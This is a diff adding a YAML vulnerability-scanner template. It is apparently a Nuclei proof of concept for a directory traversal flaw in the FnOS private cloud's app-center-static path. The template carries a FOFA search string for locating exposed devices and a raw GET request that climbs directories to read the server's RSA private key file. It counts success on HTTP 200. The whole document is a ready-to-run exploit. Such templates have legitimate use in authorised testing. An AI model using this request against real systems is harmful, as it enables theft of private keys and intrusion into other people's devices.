@@ -1,0 +1,28 @@
+id: poc-ntk5c0iz19l6fsx9
+info:
+  name: 飞牛私有云FnOS app-center-static存在目录遍历漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ntk5c0iz19l6fsx9'
+  tags: lfi,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ntk5c0iz19l6fsx9
+    fofa: app="飞牛-私有云fnOS" || icon_hash="470295793"
+http:
+- raw:
+  - '多个路径
+
+    /app-center-static/serviceicon/trim.media/
+
+    /app-center-static/xxx/xx/
+
+
+    GET /app-center-static/serviceicon/myapp/%7B0%7D/?size=../../../../usr/trim/etc/rsa_private_key.pem HTTP/1.1
+
+    Host: {{Hostname}}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
